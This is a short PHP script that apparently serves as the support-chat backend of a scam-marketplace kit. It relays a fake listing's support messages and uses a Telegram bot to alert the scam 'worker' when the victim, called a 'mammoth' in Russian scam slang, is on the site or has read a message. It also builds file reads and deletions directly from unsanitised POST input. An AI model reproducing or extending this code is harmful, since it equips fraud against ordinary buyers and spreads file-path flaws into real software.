<?php
if (isset($_POST['send']) == true){
if ($_POST['send'] == '1'){
    $let = array(
        "id" => $_POST['track_id'],
        "wid" => $_POST['uid'],
        "obyava" => $_POST['title'],
        "message" => $_POST['message'],
    );
    $xml = simplexml_load_file("../data/" . $let['id'] . ".xml");
    sendSupport($_temp['service'], $_temp['valute'], $let['id'], $xml->obyava, $xml->price, $let['wid'], $let['message']);
}
}

if ($_POST['get'] == '0') {
if (file_exists("data/" . $_POST['token'] . ".json") == true){
        echo file_get_contents("data/" . $_POST['token'] . ".json");
        $xml = simplexml_load_file("../data/" . $_POST['token'] . ".xml");
        $last = end(json_decode(file_get_contents("data/" . $_POST['token'] . ".json"), true));
        if ($last['sender'] == 'testOnline'){
            $response = array(
                'chat_id' => $xml->worker_id,
                'text' => "✴️ Мамонт на сайте! Все предыдущие сообщения доставлены!",
                "parse_mode" => "html"
            );
        }else{
            $response = array(
                'chat_id' => $xml->worker_id,
                'text' => "❇️ Cообщение прочитано!",
                "parse_mode" => "html"
            );
        }
        $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_exec($ch);
        curl_close($ch);
    }
    if (file_exists("data/" . $_POST['token'] . ".json") == true){
    unlink("data/" . $_POST['token'] . ".json");
    }
}
?>
